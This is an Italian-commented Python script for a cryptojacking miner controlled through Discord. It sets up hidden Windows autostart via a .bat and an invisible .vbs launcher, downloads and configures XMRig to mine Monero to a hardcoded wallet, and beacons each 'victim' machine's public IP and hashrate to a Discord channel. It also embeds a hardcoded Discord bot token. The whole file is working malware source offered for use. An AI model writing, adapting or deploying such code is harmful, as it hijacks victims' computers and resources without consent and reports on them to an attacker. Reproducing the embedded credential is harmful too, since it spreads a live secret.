import discord
import aiohttp
import asyncio
import os
import platform
import zipfile
import tarfile
import subprocess
import sys
import signal
import json

# === CONFIGURAZIONE ===
DISCORD_BOT_TOKEN = "MTM3NTQ5ODk0NzE2MTc1NTcyOQ.GbF5G2.UxxoeczWryHm8b3lXulEMMyYXGh8LvVf1p70X0"
DISCORD_CHANNEL_ID = 1193552133618933803
WALLET_ADDRESS = "499nha52LeQaicVZHvdcpbSA46qHpSWDC11A1M9FvZYAARaY59NJtnbBA3fgZ8GFstB49h11YDMBCWuGTZyfmP9AQBCJ4th"
POOL = "xmr.kryptex.network:7777"

UPDATE_INTERVAL = 20  # ogni 10 minuti

DOWNLOAD_DIR = r"C:\ProgramData\xmrig_silenzioso"
XMRIG_FOLDER = None
XMRIG_PROCESS = None

intents = discord.Intents.default()
client = discord.Client(intents=intents)

def setup_autostart_windows():
    # Crea .bat e .vbs per avvio invisibile all'accensione di Windows
    if platform.system() != "Windows":
        return
    startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    current_path = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(startup_dir, "avvia_miner_xmrig.bat")
    vbs_path = os.path.join(startup_dir, "avvia_miner_xmrig.vbs")
    # .bat content
    if current_path.lower().endswith(".exe"):
        bat_content = f'@echo off\n"{current_path}"\n'
    else:
        bat_content = f'@echo off\npython "{current_path}"\n'
    # .vbs content
    vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & "{bat_path}" & Chr(34), 0
Set WshShell = Nothing
'''
    try:
        with open(bat_path, "w") as f:
            f.write(bat_content)
        with open(vbs_path, "w") as f:
            f.write(vbs_content)
        print(f"Autostart creato: {vbs_path}")
    except Exception as e:
        print(f"Errore autostart: {e}")

def get_xmrig_download_url():
    system = platform.system()
    arch = platform.machine()
    if arch not in ("x86_64", "AMD64"):
        print("Architettura non supportata:", arch)
        sys.exit(1)

    if system == "Windows":
        return "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
    elif system == "Linux":
        return "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz"
    else:
        print("Sistema operativo non supportato:", system)
        sys.exit(1)

async def download_and_extract_xmrig():
    global XMRIG_FOLDER
    url = get_xmrig_download_url()
    print("Download XMRig da:", url)

    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    archive_path = os.path.join(DOWNLOAD_DIR, "xmrig_archive")

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                print("Errore download XMRig:", resp.status)
                sys.exit(1)
            content = await resp.read()
            if url.endswith(".zip"):
                archive_path += ".zip"
            elif url.endswith(".tar.gz"):
                archive_path += ".tar.gz"
            with open(archive_path, "wb") as f:
                f.write(content)
    print("Download completato.")

    if archive_path.endswith(".zip"):
        with zipfile.ZipFile(archive_path, "r") as zip_ref:
            zip_ref.extractall(DOWNLOAD_DIR)
        for item in os.listdir(DOWNLOAD_DIR):
            if os.path.isdir(os.path.join(DOWNLOAD_DIR, item)) and "xmrig" in item.lower():
                XMRIG_FOLDER = os.path.join(DOWNLOAD_DIR, item)
                break
    elif archive_path.endswith(".tar.gz"):
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall(DOWNLOAD_DIR)
        for item in os.listdir(DOWNLOAD_DIR):
            if os.path.isdir(os.path.join(DOWNLOAD_DIR, item)) and "xmrig" in item.lower():
                XMRIG_FOLDER = os.path.join(DOWNLOAD_DIR, item)
                break

    if not XMRIG_FOLDER:
        print("Errore: cartella XMRig non trovata dopo estrazione")
        sys.exit(1)
    print("Estrazione completata:", XMRIG_FOLDER)

def create_config_json():
    config = {
        "autosave": True,
        "cpu": True,
        "opencl": False,
        "cuda": False,
        "pools": [
            {
                "url": POOL,
                "user": WALLET_ADDRESS,
                "pass": "xmrig_bot",
                "keepalive": True,
                "algo": "rx/0",
                "coin": "xmr"
            }
        ],
        "api": {
            "id": "1",
            "port": 16000,
            "access-token": None,
            "worker-id": None
        }
    }
    config_path = os.path.join(XMRIG_FOLDER, "config.json")
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)
    print("config.json creato")

def get_xmrig_executable():
    system = platform.system()
    exe = "xmrig.exe" if system == "Windows" else "xmrig"
    return os.path.join(XMRIG_FOLDER, exe)

async def start_xmrig():
    global XMRIG_PROCESS
    if XMRIG_PROCESS is None:
        xmrig_exec = get_xmrig_executable()
        if not os.path.isfile(xmrig_exec):
            print("Eseguibile XMRig non trovato:", xmrig_exec)
            sys.exit(1)
        print("Avvio XMRig...")

        if platform.system() == "Windows":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            XMRIG_PROCESS = subprocess.Popen([xmrig_exec], cwd=XMRIG_FOLDER, startupinfo=startupinfo)
        else:
            XMRIG_PROCESS = subprocess.Popen([xmrig_exec], cwd=XMRIG_FOLDER)

        await asyncio.sleep(10)  # aspetta che l'API si avvii
    else:
        print("XMRig già in esecuzione.")

async def stop_xmrig():
    global XMRIG_PROCESS
    if XMRIG_PROCESS:
        print("Terminazione XMRig...")
        XMRIG_PROCESS.terminate()
        try:
            XMRIG_PROCESS.wait(timeout=5)
        except subprocess.TimeoutExpired:
            XMRIG_PROCESS.kill()
        XMRIG_PROCESS = None
        print("XMRig fermato.")

async def get_xmrig_status():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://127.0.0.1:16000/1/summary", timeout=5) as resp:
                data = await resp.json()

        hash_rate = data['hashrate']['total'][0]
        uptime = data['connection']['uptime']
        accepted = data['results']['accepted']
        rejected = data['results']['rejected']
        total_hashes = data['results']['hashes_total']

        return (
            f"🛡️ Vittima connessa! IP: 🌐 {await get_public_ip()}\n"
            f"⏱️ Uptime: {uptime} sec\n"
            f"⚙️ Hashrate: {hash_rate} H/s\n"
            f"✅ Accettati: {accepted}\n"
            f"❌ Rigettati: {rejected}\n"
            f"📈 Totale Hash: {total_hashes}\n"
        )
    except Exception as e:
        return f"❗ Errore nel recupero dati da XMRig: {e}"

async def get_public_ip():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.ipify.org?format=text', timeout=5) as resp:
                return await resp.text()
    except Exception:
        return "IP non disponibile"

@client.event
async def on_ready():
    print(f"Bot Discord connesso come {client.user}")
    channel = client.get_channel(DISCORD_CHANNEL_ID)
    if channel is None:
        print("Canale Discord non trovato!")
        await client.close()
        return

    # Scarica ed estrae XMRig se non già fatto
    if not XMRIG_FOLDER:
        await download_and_extract_xmrig()
        create_config_json()

    await start_xmrig()

    ip = await get_public_ip()
    await channel.send(f"🚀 Vittima connessa! IP: 🌐 {ip}")

    async def status_loop():
        while True:
            status = await get_xmrig_status()
            await channel.send(status)
            await asyncio.sleep(UPDATE_INTERVAL)

    asyncio.create_task(status_loop())

@client.event
async def on_disconnect():
    print("Bot disconnesso!")

def shutdown_handler(signum, frame):
    print("Ricevuto segnale di terminazione, fermo XMRig...")
    if XMRIG_PROCESS:
        XMRIG_PROCESS.terminate()
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, shutdown_handler)
    signal.signal(signal.SIGTERM, shutdown_handler)

    setup_autostart_windows()

    client.run(DISCORD_BOT_TOKEN)
